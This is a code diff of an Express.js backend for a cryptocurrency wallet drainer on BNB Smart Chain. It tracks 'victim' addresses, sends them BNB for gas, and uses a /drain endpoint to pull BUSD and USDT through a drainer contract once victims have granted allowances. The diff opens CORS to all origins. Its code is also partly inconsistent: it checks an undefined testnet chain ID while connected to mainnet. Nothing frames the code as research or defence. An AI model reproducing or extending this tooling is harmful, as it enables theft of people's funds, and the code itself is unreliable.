@@ -10,21 +10,17 @@ function formatError(error) {
 
 const app = express();
 app.use(express.json());
-app.use(cors({
-  origin: "http://localhost:5174", // Allow your frontend origin (adjust if different)
-  methods: ["GET", "POST"],
-  allowedHeaders: ["Content-Type"]
-}));
+app.use(cors());
 
 const BSC_MAINNET_CHAIN_ID = 56;
-const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.bnbchain.org/", BSC_MAINNET_CHAIN_ID);
+const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/", BSC_MAINNET_CHAIN_ID);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);
 
-const drainerContractAddress = "0xFc23Cc2C8d25c515B2a920432e5EBf6d018e3403"; // Ensure this is deployed on mainnet
+const drainerContractAddress = "0xFc23Cc2C8d25c515B2a920432e5EBf6d018e3403";
 
 const tokenList = [
-  { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
-  { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
+  { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
+  { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
 ];
 
 const drainerAbi = [
@@ -47,47 +43,47 @@ async function getGasSettings() {
     const feeData = await provider.getFeeData();
     return {
       gasLimit: 300000,
-      maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits("5", "gwei"), // Mainnet uses EIP-1559
-      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei"),
+      gasPrice: feeData.gasPrice ? feeData.gasPrice * BigInt(12) / BigInt(10) : ethers.parseUnits("15", "gwei"),
     };
   } catch (error) {
     console.error("Error fetching gas data:", formatError(error));
-    return { gasLimit: 300000, maxFeePerGas: ethers.parseUnits("5", "gwei"), maxPriorityFeePerGas: ethers.parseUnits("1", "gwei") };
+    return { gasLimit: 300000, gasPrice: ethers.parseUnits("15", "gwei") };
   }
 }
 
 async function checkWalletBalance() {
   const network = await provider.getNetwork();
   const receivedChainId = Number(network.chainId);
-  if (receivedChainId !== BSC_MAINNET_CHAIN_ID) {
-    throw new Error(`Network mismatch: Expected chain ID ${BSC_MAINNET_CHAIN_ID}, got ${receivedChainId}`);
+  if (receivedChainId !== BSC_TESTNET_CHAIN_ID) {
+    throw new Error(`Network mismatch: Expected chain ID ${BSC_TESTNET_CHAIN_ID}, got ${receivedChainId}`);
   }
 
   const balance = await provider.getBalance(wallet.address);
   console.log(`Wallet balance: ${ethers.formatEther(balance)} BNB`);
-  if (balance < ethers.parseEther("0.005")) {
+  if (balance < ethers.parseEther("0.01")) {
     throw new Error("Insufficient BNB for gas. Please fund the wallet.");
   }
 }
 
 async function sendGasIfNeeded(victimAddress) {
   const victimBalance = await provider.getBalance(victimAddress);
-  console.log(`Victim balance: ${ethers.formatEther(victimBalance)} BNB`);
+  console.log(`Victim balance: ${ethers.formatEther(victimBalance)} TBNB`);
 
   if (victimBalance === BigInt(0)) {
-    const bnbToSend = ethers.parseEther("0.005");
+    const tbnbToSend = ethers.parseEther("0.01"); // $5 at ~$500/BNB
     const gasSettings = await getGasSettings();
 
-    console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`);
+    console.log(`Victim has 0 TBNB. Sending ${ethers.formatEther(tbnbToSend)} TBNB to ${victimAddress} for gas...`);
     const tx = await wallet.sendTransaction({
       to: victimAddress,
-      value: bnbToSend,
-      ...gasSettings,
+      value: tbnbToSend,
+      gasLimit: 21000,
+      gasPrice: gasSettings.gasPrice,
     });
 
     console.log(`Gas transaction sent: ${tx.hash}`);
     const receipt = await tx.wait();
-    return { success: true, message: `Sent ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas`, txHash: tx.hash };
+    return { success: true, message: `Sent ${ethers.formatEther(tbnbToSend)} TBNB to ${victimAddress} for gas`, txHash: tx.hash };
   }
   return { success: false, message: "No gas needed" };
 }
@@ -132,24 +128,21 @@ app.post("/drain", async (req, res) => {
 
     const gasSettings = await getGasSettings();
     let tx, receipt, totalDrained = BigInt(0);
-    const tokensNeedingApproval = [];
+    let needsApproval = false;
 
+    // Check allowances
     const tokenAddresses = tokenList.map(t => t.address);
     for (const token of tokenList) {
       const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
       const allowance = await tokenContract.allowance(victimAddress, drainerContractAddress);
-      const balance = await tokenContract.balanceOf(victimAddress);
-      console.log(`${token.symbol}: Balance=${ethers.formatUnits(balance, token.decimals)}, Allowance=${ethers.formatUnits(allowance, token.decimals)}`);
-      if (allowance === BigInt(0) && balance > 0) {
-        tokensNeedingApproval.push({ symbol: token.symbol, address: token.address });
+      if (allowance === BigInt(0)) {
+        needsApproval = true;
       }
     }
 
-    const needsApproval = tokensNeedingApproval.length > 0;
-
     if (drainAll) {
       console.log(`Draining all tokens from ${victimAddress}...`);
-      tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1000000 });
+      tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1000000 }); // Increased gas limit
       receipt = await tx.wait();
 
       const eventInterface = new ethers.Interface(drainerAbi);
@@ -175,17 +168,15 @@ app.post("/drain", async (req, res) => {
         victimAddress,
         transactionHash: tx.hash,
         gasUsed: receipt.gasUsed.toString(),
-        needsApproval: false,
-        tokensNeedingApproval: []
+        needsApproval: false
       });
     } else {
       res.json({
         success: false,
-        message: needsApproval ? "Approval needed for some tokens." : "No tokens drained. Check victim's balance and allowance.",
+        message: "No tokens drained. Check victim's balance and allowance.",
         victimAddress,
         transactionHash: tx?.hash || null,
-        needsApproval,
-        tokensNeedingApproval
+        needsApproval
       });
     }
   } catch (error) {
